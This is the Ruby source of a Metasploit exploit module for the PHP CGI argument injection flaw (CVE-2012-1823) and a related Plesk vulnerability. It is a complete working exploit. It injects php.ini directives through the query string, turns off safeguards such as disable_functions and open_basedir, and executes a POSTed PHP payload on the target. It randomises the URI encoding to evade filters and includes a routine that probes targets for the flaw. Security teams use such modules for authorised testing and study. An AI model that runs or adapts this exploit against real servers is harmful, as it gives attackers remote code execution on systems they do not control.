##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
def initialize(info = {})
super(update_info(info,
'Name' => 'PHP CGI Argument Injection',
'Description' => %q{
When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to
an argument injection vulnerability. This module takes advantage of
the -d flag to set php.ini directives to achieve code execution.
From the advisory: "if there is NO unescaped '=' in the query string,
the string is split on '+' (encoded space) characters, urldecoded,
passed to a function that escapes shell metacharacters (the "encoded in
a system-defined manner" from the RFC) and then passes them to the CGI
binary." This module can also be used to exploit the plesk 0day 
disclosed
by kingcope and exploited in the wild on June 2013.
},
'Author' =>
[
'egypt', 'hdm', #original msf exploit
'jjarmoc', #added URI encoding obfuscation
'kingcope', #plesk poc
'juan vazquez' #add support for plesk exploitation
],
'License' => MSF_LICENSE,
'References' => [
[ 'CVE', '2012-1823' ],
[ 'OSVDB', '81633'],
[ 'OSVDB', '93979'],
[ 'EDB', '25986'],
[ 'URL', 'http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/' 
],
[ 'URL', 'http://kb.parallels.com/en/116241']
],
'Privileged' => false,
'Payload' =>
{
'DisableNops' => true,
# Arbitrary big number. The payload gets sent as an HTTP
# response body, so really it's unlimited
'Space' => 262144, # 256k
},
'DisclosureDate' => 'May 03 2012',
'Platform' => 'php',
'Arch' => ARCH_PHP,
'Targets' => [[ 'Automatic', { }]],
'DefaultTarget' => 0))
register_options([
OptString.new('TARGETURI', [false, "The URI to request (must be a 
CGI-handled PHP script)"]),
OptInt.new('URIENCODING', [true, "Level of URI URIENCODING and padding 
(0 for minimum)",0]),
OptBool.new('PLESK', [true, "Exploit Plesk", false]),
], self.class)
end
# php-cgi -h
# ...
# -s Display colour syntax highlighted source.
def check
vprint_status("Checking uri #{uri}")
response = send_request_raw({ 'uri' => uri })
if response and response.code == 200 and response.body =~ 
/\<code\>\<span style.*\&lt\;\?/mi and not datastore['PLESK']
vprint_error("Server responded in a way that was ambiguous, could not 
determine whether it was vulnerable")
return Exploit::CheckCode::Unknown
end
response = send_request_raw({ 'uri' => uri + "?#{create_arg("-s")}"})
if response and response.code == 200 and response.body =~ 
/\<code\>\<span style.*\&lt\;\?/mi
return Exploit::CheckCode::Vulnerable
end
if datastore['PLESK'] and response and response.code == 500
return Exploit::CheckCode::Appears
end
vprint_error("Server responded indicating it was not vulnerable")
return Exploit::CheckCode::Safe
end
def uri
if datastore['PLESK']
normalize_uri("phppath", "php")
else
normalize_uri(target_uri.path).gsub(/\?.*/, "")
end
end
def uri_encoding_level
if datastore['PLESK']
return 0
else
return datastore['URIENCODING']
end
end
def exploit
begin
args = [
rand_spaces(),
create_arg("-d","allow_url_include=#{rand_php_ini_true}"),
create_arg("-d","safe_mode=#{rand_php_ini_false}"),
create_arg("-d","suhosin.simulation=#{rand_php_ini_true}"),
create_arg("-d",'disable_functions=""'),
create_arg("-d","open_basedir=none"),
create_arg("-d","auto_prepend_file=php://input"),
rand_opt_equiv("-n")
]
qs = args.join()
# Has to be all on one line, so gsub out the comments and the newlines
payload_oneline = "<?php " + payload.encoded.gsub(/\s*#.*$/, 
"").gsub("\n", "")
response = send_request_cgi( {
'method' => "POST",
'global' => true,
'uri' => "#{uri}?#{qs}",
'data' => payload_oneline,
}, 0.5)
handler
rescue ::Interrupt
raise $!
rescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused
print_error("The target service unreachable")
rescue ::OpenSSL::SSL::SSLError
print_error("The target failed to negotiate SSL, is this really an SSL 
service?")
end
end
def create_arg(arg, val = nil)
if val
val = rand_encode(val)
val.gsub!('=','%3d') # = must always be encoded
val.gsub!('"','%22') # " too
end
ret = ''
ret << "#{rand_spaces}"
ret << "#{rand_opt_equiv(arg)}"
ret << "#{rand_space}"
ret << "#{rand_spaces}"
ret << "#{val}"
ret << "#{rand_space}"
end
def rand_opt_equiv(opt)
# Returns a random equivilant option from mapping at
# http://www.php.net/manual/en/features.commandline.options.php
opt_equivs = {
"-d" => [
"#{rand_dash}#{rand_encode("d")}",
"#{rand_dash}#{rand_dash}#{rand_encode("define")}"
],
"-s" => [
"#{rand_dash}#{rand_encode("s")}",
"#{rand_dash}#{rand_dash}#{rand_encode("syntax-highlight")}",
"#{rand_dash}#{rand_dash}#{rand_encode("syntax-highlighting")}"
],
"-T" => [
"#{rand_dash}#{rand_encode("T")}",
"#{rand_dash}#{rand_dash}#{rand_encode("timing")}"
],
"-n" => [
"#{rand_dash}#{rand_encode("n")}",
"#{rand_dash}#{rand_dash}#{rand_encode("no-php-ini")}"
]
}
equivs = opt_equivs[opt]
equivs ? equivs[rand(opt_equivs[opt].length)] : opt
end
def rand_encode(string, max = string.length)
# Randomly URI encode characters from string, up to max times.
chars = [];
if max > uri_encoding_level then max = uri_encoding_level end
if string.length == 1
if rand(2) > 0
chars << 0
end
else
if max > 0
max.times { chars << rand(string.length)}
end
end
chars.uniq.sort.reverse.each{|index| string[index] = 
Rex::Text.uri_encode(string[index,1], "hex-noslashes")}
string
end
def rand_spaces(num = uri_encoding_level)
ret = ''
num.times {
ret << rand_space
}
ret
end
def rand_space
uri_encoding_level > 0 ? ["%20","%09","+"][rand(3)] : "+"
end
def rand_dash
uri_encoding_level > 0 ? ["-","%2d","%2D"][rand(3)] : "-"
end
def rand_php_ini_false
Rex::Text.to_rand_case([ "0", "off", "false" ][rand(3)])
end
def rand_php_ini_true
Rex::Text.to_rand_case([ "1", "on", "true" ][rand(3)])
end
end
